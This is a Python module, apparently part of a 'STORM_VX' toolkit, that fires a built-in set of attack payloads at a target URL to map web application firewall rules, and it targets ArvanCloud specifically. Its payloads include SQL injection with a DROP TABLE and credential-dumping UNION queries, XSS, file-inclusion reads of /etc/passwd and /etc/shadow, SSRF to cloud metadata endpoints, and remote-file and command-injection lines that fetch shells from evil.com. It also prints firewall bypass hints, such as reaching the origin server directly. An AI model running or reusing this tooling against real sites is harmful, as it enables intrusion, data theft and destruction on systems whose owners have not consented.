#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
╔═══════════════════════════════════════════════════════════════════════════╗
║  vf_waf_probe.py — WAF Prober Module                                    ║
║  Part of the STORM_VX Toolkit                                           ║
║                                                                          ║
║  Sends malicious payloads to probe WAF rules and detect bypasses.        ║
║  Tests SQLi, XSS, LFI, RFI, Command Injection, Path Traversal, SSRF.    ║
║  ArvanCloud-specific: detects 500 status code as block indicator.        ║
║                                                                          ║
║  FOR AUTHORIZED TESTING ONLY!                                            ║
╚═══════════════════════════════════════════════════════════════════════════╝
"""

import asyncio
import re
import time
from typing import Dict, List, Tuple
from urllib.parse import urlparse, urlencode

import aiohttp


# ═══════════════════════════════════════════════════════════════════════════════
# Colors
# ═══════════════════════════════════════════════════════════════════════════════

class C:
    R = '\033[91m'; G = '\033[92m'; Y = '\033[93m'; B = '\033[94m'
    M = '\033[95m'; CY = '\033[96m'; W = '\033[97m'; BD = '\033[1m'
    DM = '\033[2m'; RS = '\033[0m'


# ═══════════════════════════════════════════════════════════════════════════════
# Payload Database — 30+ payloads across categories
# ═══════════════════════════════════════════════════════════════════════════════

PAYLOADS = {
    "SQLi": [
        {"payload": "' OR 1=1--", "location": "query", "param": "q"},
        {"payload": "\" OR 1=1--", "location": "query", "param": "q"},
        {"payload": "' UNION SELECT NULL,NULL,NULL--", "location": "query", "param": "id"},
        {"payload": "1; DROP TABLE users--", "location": "query", "param": "id"},
        {"payload": "' AND 1=1--", "location": "query", "param": "q"},
        {"payload": "1' OR '1'='1", "location": "query", "param": "id"},
        {"payload": "admin'--", "location": "query", "param": "user"},
        {"payload": "1 UNION SELECT username,password FROM users--", "location": "query", "param": "id"},
        {"payload": "' OR SLEEP(5)--", "location": "query", "param": "q"},
        {"payload": "1; WAITFOR DELAY '0:0:5'--", "location": "query", "param": "id"},
    ],
    "XSS": [
        {"payload": "<script>alert(1)</script>", "location": "query", "param": "q"},
        {"payload": "<img src=x onerror=alert(1)>", "location": "query", "param": "q"},
        {"payload": "javascript:alert(1)", "location": "query", "param": "url"},
        {"payload": "<svg/onload=alert(1)>", "location": "query", "param": "q"},
        {"payload": "'\"><script>alert(1)</script>", "location": "query", "param": "q"},
        {"payload": "<body onload=alert(1)>", "location": "query", "param": "q"},
        {"payload": "<iframe src=\"javascript:alert(1)\">", "location": "query", "param": "q"},
        {"payload": "<details open ontoggle=alert(1)>", "location": "query", "param": "q"},
    ],
    "LFI": [
        {"payload": "../../../etc/passwd", "location": "query", "param": "file"},
        {"payload": "..\\..\\..\\windows\\system32\\config\\sam", "location": "query", "param": "file"},
        {"payload": "/proc/self/environ", "location": "query", "param": "path"},
        {"payload": "....//....//....//etc/passwd", "location": "query", "param": "file"},
        {"payload": "/etc/shadow", "location": "query", "param": "file"},
        {"payload": "..%2f..%2f..%2fetc%2fpasswd", "location": "query", "param": "file"},
        {"payload": "/var/log/apache2/access.log", "location": "query", "param": "file"},
    ],
    "RFI": [
        {"payload": "http://evil.com/shell.php", "location": "query", "param": "url"},
        {"payload": "http://attacker.com/malicious.txt", "location": "query", "param": "page"},
        {"payload": "ftp://evil.com/backdoor", "location": "query", "param": "url"},
    ],
    "Command Injection": [
        {"payload": "; ls", "location": "query", "param": "cmd"},
        {"payload": "| cat /etc/passwd", "location": "query", "param": "cmd"},
        {"payload": "`id`", "location": "query", "param": "cmd"},
        {"payload": "$(whoami)", "location": "query", "param": "cmd"},
        {"payload": "; cat /etc/shadow", "location": "query", "param": "cmd"},
        {"payload": "& ping -c 3 127.0.0.1", "location": "query", "param": "cmd"},
        {"payload": "|| wget http://evil.com/shell.sh", "location": "query", "param": "cmd"},
    ],
    "Path Traversal": [
        {"payload": "/..%252f..%252f..%252fetc/passwd", "location": "path", "param": ""},
        {"payload": "/....//....//etc/passwd", "location": "path", "param": ""},
        {"payload": "/..%c0%af..%c0%af..%c0%afetc/passwd", "location": "path", "param": ""},
        {"payload": "/..%ef%bc%8f..%ef%bc%8fetc/passwd", "location": "path", "param": ""},
    ],
    "SSRF": [
        {"payload": "http://127.0.0.1", "location": "query", "param": "url"},
        {"payload": "http://169.254.169.254/latest/meta-data/", "location": "query", "param": "url"},
        {"payload": "http://[::1]", "location": "query", "param": "url"},
        {"payload": "http://0x7f000001/", "location": "query", "param": "url"},
        {"payload": "http://0177.0.0.1/", "location": "query", "param": "url"},
        {"payload": "http://metadata.google.internal/", "location": "query", "param": "url"},
    ],
    "POST Body": [
        {"payload": "' OR 1=1--", "location": "body", "param": "username"},
        {"payload": "<script>alert(1)</script>", "location": "body", "param": "comment"},
        {"payload": "../../../etc/passwd", "location": "body", "param": "file"},
        {"payload": "; cat /etc/passwd", "location": "body", "param": "cmd"},
        {"payload": "http://169.254.169.254/", "location": "body", "param": "url"},
    ],
    "Header Injection": [
        {"payload": "' OR 1=1--", "location": "header", "param": "X-Forwarded-For"},
        {"payload": "<script>alert(1)</script>", "location": "header", "param": "User-Agent"},
        {"payload": "http://169.254.169.254/", "location": "header", "param": "X-Original-URL"},
        {"payload": "/admin", "location": "header", "param": "X-Rewrite-URL"},
    ],
    "URL Encoded Bypass": [
        {"payload": "%27%20OR%201%3D1--", "location": "query", "param": "q"},
        {"payload": "%3Cscript%3Ealert(1)%3C/script%3E", "location": "query", "param": "q"},
        {"payload": "%2F..%2F..%2F..%2Fetc%2Fpasswd", "location": "query", "param": "file"},
    ],
}


class WAFProber:
    """
    WAF prober for STORM_VX.

    Sends malicious payloads to determine WAF rules, blocked categories,
    and potential bypass techniques. ArvanCloud-specific detection included.
    """

    # WAF block indicators by response
    BLOCK_INDICATORS = {
        "status_codes": [403, 406, 429, 500, 501, 503],
        "body_patterns": [
            r"(?i)access\s+denied",
            r"(?i)forbidden",
            r"(?i)blocked",
            r"(?i)firewall",
            r"(?i)waf",
            r"(?i)security",
            r"(?i)not\s+allowed",
            r"(?i)request\s+rejected",
            r"(?i)suspicious",
            r"(?i)malicious",
            r"(?i)attack\s+detected",
            r"(?i)arvancloud",
            r"(?i)arvan",
            r"(?i)cloudflare",
            r"(?i)ray\s+id",
            r"(?i)challenge",
            r"(?i)captcha",
            r"(?i)bot\s+detection",
        ],
        "header_patterns": {
            "Server": r"(?i)(arvan|cloudflare|sucuri|incapsula|akamai)",
        },
    }

    def __init__(self, url: str, waf_name: str = "", timeout: int = 15):
        """
        Initialize WAFProber.

        Args:
            url: Target URL
            waf_name: Known WAF name (e.g., 'ArvanCloud') or empty for auto-detect
            timeout: HTTP request timeout in seconds
        """
        self.url = url
        self.waf_name = waf_name
        self.timeout = timeout
        self.baseline_status: int = 200
        self.baseline_body: str = ""
        self.baseline_size: int = 0

    async def run(self) -> Dict:
        """
        Run WAF probing.

        Returns:
            Dictionary with:
                - waf_name: Detected or provided WAF name
                - blocked_payloads: List of blocked payloads with details
                - allowed_payloads: List of payloads that passed through
                - bypass_hints: List of potential bypass techniques
                - rules_detected: Dict of category -> blocked count
        """
        print(f"\n  {C.BD}{C.CY}[*] WAF Prober — {self.url}{C.RS}")
        if self.waf_name:
            print(f"  {C.DM}    Known WAF: {self.waf_name} | Timeout: {self.timeout}s{C.RS}")
        else:
            print(f"  {C.DM}    Auto-detecting WAF | Timeout: {self.timeout}s{C.RS}")

        t0 = time.time()

        # Step 1: Establish baseline
        print(f"  {C.B}  [1/4] Establishing baseline response...{C.RS}")
        await self._establish_baseline()

        # Step 2: Send payloads
        print(f"  {C.B}  [2/4] Sending attack payloads...{C.RS}")
        blocked, allowed = await self._send_payloads()

        # Step 3: Analyze rules
        print(f"  {C.B}  [3/4] Analyzing WAF rules...{C.RS}")
        rules = self._analyze_rules(blocked, allowed)

        # Step 4: Generate bypass hints
        print(f"  {C.B}  [4/4] Generating bypass hints...{C.RS}")
        bypass_hints = self._generate_bypass_hints(blocked, allowed, rules)

        elapsed = time.time() - t0

        # Print results table
        self._print_results_table(blocked, allowed, rules, bypass_hints, elapsed)

        return {
            "waf_name": self.waf_name or "Unknown",
            "blocked_payloads": blocked,
            "allowed_payloads": allowed,
            "bypass_hints": bypass_hints,
            "rules_detected": rules,
        }

    async def _establish_baseline(self):
        """Send a benign request to establish baseline response."""
        timeout_cfg = aiohttp.ClientTimeout(total=self.timeout)
        try:
            async with aiohttp.ClientSession(timeout=timeout_cfg) as session:
                async with session.get(
                    self.url, ssl=False, allow_redirects=False
                ) as resp:
                    self.baseline_status = resp.status
                    self.baseline_body = await resp.text()
                    self.baseline_size = len(self.baseline_body)

                    # Auto-detect WAF from headers
                    if not self.waf_name:
                        self.waf_name = self._detect_waf_from_headers(dict(resp.headers))

                    print(f"  {C.G}    Baseline: HTTP {self.baseline_status} | Size: {self.baseline_size:,}B{C.RS}")
                    if self.waf_name:
                        print(f"  {C.G}    WAF detected: {self.waf_name}{C.RS}")
        except Exception as e:
            print(f"  {C.Y}    Baseline error: {e}{C.RS}")

    def _detect_waf_from_headers(self, headers: Dict[str, str]) -> str:
        """Detect WAF from response headers."""
        server = headers.get("Server", "").lower()
        if "arvan" in server:
            return "ArvanCloud"
        if "cloudflare" in server:
            return "Cloudflare"
        if "sucuri" in server:
            return "Sucuri"
        if "incapsula" in headers.get("X-CDN", "").lower():
            return "Imperva (Incapsula)"
        if "akamai" in headers.get("X-Cache", "").lower():
            return "Akamai"

        # Check cookies
        set_cookie = headers.get("Set-Cookie", "").lower()
        if "__cf_bm" in set_cookie or "cf_clearance" in set_cookie:
            return "Cloudflare"

        return ""

    async def _send_payloads(self) -> Tuple[List[Dict], List[Dict]]:
        """Send all payloads and categorize results."""
        blocked = []
        allowed = []
        total_payloads = sum(len(p) for p in PAYLOADS.values())
        sent = 0

        timeout_cfg = aiohttp.ClientTimeout(total=self.timeout)

        async with aiohttp.ClientSession(timeout=timeout_cfg) as session:
            for category, payload_list in PAYLOADS.items():
                print(f"  {C.CY}    Testing {category} ({len(payload_list)} payloads)...{C.RS}")

                for item in payload_list:
                    sent += 1
                    payload = item["payload"]
                    location = item["location"]
                    param = item["param"]

                    try:
                        result = await self._send_single_payload(
                            session, payload, location, param
                        )
                        result["category"] = category
                        result["payload"] = payload
                        result["location"] = location

                        if result.get("blocked", False):
                            blocked.append(result)
                            status_str = f"{C.R}BLOCKED{C.RS}"
                        else:
                            allowed.append(result)
                            status_str = f"{C.G}PASSED{C.RS}"

                        print(
                            f"  {C.DM}    [{sent}/{total_payloads}]{C.RS} "
                            f"{status_str} {C.W}{category}{C.RS}: "
                            f"{payload[:40]}... → HTTP {result.get('status_code', 'N/A')}"
                        )

                    except Exception as e:
                        print(f"  {C.Y}    [{sent}/{total_payloads}] Error: {type(e).__name__}{C.RS}")

                    # Small delay to avoid triggering rate limits
                    await asyncio.sleep(0.2)

        return blocked, allowed

    async def _send_single_payload(
        self,
        session: aiohttp.ClientSession,
        payload: str,
        location: str,
        param: str
    ) -> Dict:
        """Send a single payload and record the response."""
        result = {
            "payload": payload,
            "location": location,
            "param": param,
            "status_code": 0,
            "body_snippet": "",
            "blocked": False,
            "block_reason": "",
        }

        try:
            if location == "query":
                parsed = urlparse(self.url)
                base = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
                url = f"{base}?{param}={payload}"
                async with session.get(url, ssl=False, allow_redirects=False) as resp:
                    result["status_code"] = resp.status
                    body = await resp.text()
                    result["body_snippet"] = body[:200]
                    result["blocked"] = self._is_blocked(resp.status, body, dict(resp.headers))

            elif location == "path":
                parsed = urlparse(self.url)
                base = f"{parsed.scheme}://{parsed.netloc}"
                url = f"{base}{payload}"
                async with session.get(url, ssl=False, allow_redirects=False) as resp:
                    result["status_code"] = resp.status
                    body = await resp.text()
                    result["body_snippet"] = body[:200]
                    result["blocked"] = self._is_blocked(resp.status, body, dict(resp.headers))

            elif location == "body":
                parsed = urlparse(self.url)
                url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
                data = {param: payload}
                async with session.post(
                    url, data=data, ssl=False, allow_redirects=False
                ) as resp:
                    result["status_code"] = resp.status
                    body = await resp.text()
                    result["body_snippet"] = body[:200]
                    result["blocked"] = self._is_blocked(resp.status, body, dict(resp.headers))

            elif location == "header":
                parsed = urlparse(self.url)
                url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
                headers = {param: payload}
                async with session.get(
                    url, headers=headers, ssl=False, allow_redirects=False
                ) as resp:
                    result["status_code"] = resp.status
                    body = await resp.text()
                    result["body_snippet"] = body[:200]
                    result["blocked"] = self._is_blocked(resp.status, body, dict(resp.headers))

        except asyncio.TimeoutError:
            result["blocked"] = True
            result["block_reason"] = "Timeout (possible WAF delay)"
        except Exception as e:
            result["blocked"] = False
            result["block_reason"] = f"Error: {type(e).__name__}"

        return result

    def _is_blocked(self, status_code: int, body: str, headers: Dict[str, str]) -> bool:
        """
        Determine if a response indicates the payload was blocked by WAF.

        ArvanCloud-specific: 500 status can also indicate a block.
        """
        # Status code check
        if status_code in self.BLOCK_INDICATORS["status_codes"]:
            return True

        # ArvanCloud-specific: 500 with specific body patterns
        if status_code == 500 and self.waf_name.lower() == "arvancloud":
            return True

        # Status code changed from baseline
        if status_code != self.baseline_status and status_code >= 400:
            return True

        # Body pattern check
        for pattern in self.BLOCK_INDICATORS["body_patterns"]:
            if re.search(pattern, body):
                return True

        # Header pattern check
        for header_name, pattern in self.BLOCK_INDICATORS["header_patterns"].items():
            header_val = headers.get(header_name, "")
            if header_val and re.search(pattern, header_val):
                return True

        # Body size significantly different from baseline (WAF replaced content)
        if self.baseline_size > 0:
            size_diff = abs(len(body) - self.baseline_size)
            size_ratio = size_diff / self.baseline_size
            if size_ratio > 0.5 and status_code >= 400:
                return True

        return False

    def _analyze_rules(
        self, blocked: List[Dict], allowed: List[Dict]
    ) -> Dict[str, Dict]:
        """Analyze which categories are blocked and at what rate."""
        rules = {}
        categories = set()

        for item in blocked + allowed:
            categories.add(item.get("category", "Unknown"))

        for cat in categories:
            cat_blocked = [b for b in blocked if b.get("category") == cat]
            cat_allowed = [a for a in allowed if a.get("category") == cat]
            total = len(cat_blocked) + len(cat_allowed)

            # Determine which locations are blocked
            blocked_locations = set()
            for b in cat_blocked:
                loc = b.get("location", "unknown")
                blocked_locations.add(loc)

            rules[cat] = {
                "total_tested": total,
                "blocked": len(cat_blocked),
                "allowed": len(cat_allowed),
                "block_rate": round(len(cat_blocked) / total, 2) if total > 0 else 0,
                "blocked_locations": sorted(blocked_locations),
            }

        return rules

    def _generate_bypass_hints(
        self,
        blocked: List[Dict],
        allowed: List[Dict],
        rules: Dict[str, Dict]
    ) -> List[str]:
        """Generate potential bypass hints based on test results."""
        hints = []

        # Check if URL encoding bypasses detection
        url_encoded_blocked = [b for b in blocked if "URL Encoded" in b.get("category", "")]
        url_encoded_allowed = [a for a in allowed if "URL Encoded" in a.get("category", "")]
        if url_encoded_allowed and not url_encoded_blocked:
            hints.append("URL encoding bypasses WAF detection — double-encode payloads for bypass")
        elif url_encoded_allowed:
            hints.append("Partial URL encoding bypass detected — some encoded payloads pass through")

        # Check POST body vs query string
        post_blocked = [b for b in blocked if b.get("location") == "body"]
        post_allowed = [a for a in allowed if a.get("location") == "body"]
        query_blocked = [b for b in blocked if b.get("location") == "query"]

        if post_allowed and len(post_blocked) < len(query_blocked):
            hints.append("WAF inspects GET parameters more strictly than POST body — use POST for bypass")

        # Check header injection
        header_allowed = [a for a in allowed if a.get("location") == "header"]
        if header_allowed:
            hints.append("Header injection payloads pass WAF — try X-Forwarded-For, X-Original-URL bypass")

        # Check path-based payloads
        path_blocked = [b for b in blocked if b.get("location") == "path"]
        path_allowed = [a for a in allowed if a.get("location") == "path"]
        if path_allowed:
            hints.append("Path-based traversal payloads not fully blocked — use path-based attacks")

        # Category-specific hints
        for cat, info in rules.items():
            if info["block_rate"] == 0 and info["total_tested"] > 0:
                hints.append(f"Category '{cat}' has 0% block rate — WAF does not detect these attacks")
            elif info["block_rate"] < 0.5:
                hints.append(f"Category '{cat}' has {info['block_rate']:.0%} block rate — partial detection, obfuscation may bypass")

        # ArvanCloud-specific hints
        if self.waf_name.lower() == "arvancloud":
            hints.append("ArvanCloud: Try adding 'arvanpfz' query parameter to bypass cache layer")
            hints.append("ArvanCloud: Test with different Host header values to reach origin directly")
            hints.append("ArvanCloud: HTTP/2 may bypass certain inspection rules")
            hints.append("ArvanCloud: Test chunked transfer encoding for POST body bypass")

        # Check for SSRF allowance
        ssrf_allowed = [a for a in allowed if a.get("category") == "SSRF"]
        if ssrf_allowed:
            hints.append("SSRF payloads not blocked — potential for internal network access")

        # Check for command injection allowance
        cmdi_allowed = [a for a in allowed if a.get("category") == "Command Injection"]
        if cmdi_allowed:
            hints.append("Command injection payloads pass through — critical vulnerability if backend is vulnerable")

        if not hints:
            hints.append("WAF appears to block most payloads — consider encoding and obfuscation techniques")

        return hints

    def _print_results_table(
        self,
        blocked: List[Dict],
        allowed: List[Dict],
        rules: Dict[str, Dict],
        bypass_hints: List[str],
        elapsed: float
    ):
        """Print formatted results table."""
        print(f"\n  {C.G}  ╔══════════════════════════════════════════════════════════════╗{C.RS}")
        print(f"  {C.G}  ║  WAF Probe Results                                         ║{C.RS}")
        print(f"  {C.G}  ╠══════════════════════════════════════════════════════════════╣{C.RS}")
        print(f"  {C.G}  ║  WAF: {C.W}{self.waf_name or 'Unknown':<53}{C.G}║{C.RS}")
        print(f"  {C.G}  ║  Blocked: {C.R}{len(blocked):<10}{C.G}  Allowed: {C.G}{len(allowed):<10}{C.G}  Total: {C.W}{len(blocked)+len(allowed):<10}{C.G}║{C.RS}")
        print(f"  {C.G}  ╠══════════════════════════════════════════════════════════════╣{C.RS}")

        # Rules by category
        for cat, info in sorted(rules.items()):
            bar_len = 20
            filled = int(info["block_rate"] * bar_len)
            bar = f"{'█' * filled}{'░' * (bar_len - filled)}"
            if info["block_rate"] > 0.7:
                color = C.R
            elif info["block_rate"] > 0.3:
                color = C.Y
            else:
                color = C.G
            print(
                f"  {C.G}  ║{C.RS}  {C.W}{cat:<20}{C.RS} {color}[{bar}]{C.RS} "
                f"{info['block_rate']:.0%} ({info['blocked']}/{info['total_tested']})"
            )

        print(f"  {C.G}  ╠══════════════════════════════════════════════════════════════╣{C.RS}")
        print(f"  {C.G}  ║  Bypass Hints:{C.RS}")
        for hint in bypass_hints:
            print(f"  {C.G}  ║{C.RS}  {C.Y}  → {hint}{C.RS}")

        print(f"  {C.G}  ╠══════════════════════════════════════════════════════════════╣{C.RS}")
        print(f"  {C.G}  ║  Time: {C.CY}{elapsed:.1f}s{C.RS}")
        print(f"  {C.G}  ╚══════════════════════════════════════════════════════════════╝{C.RS}")
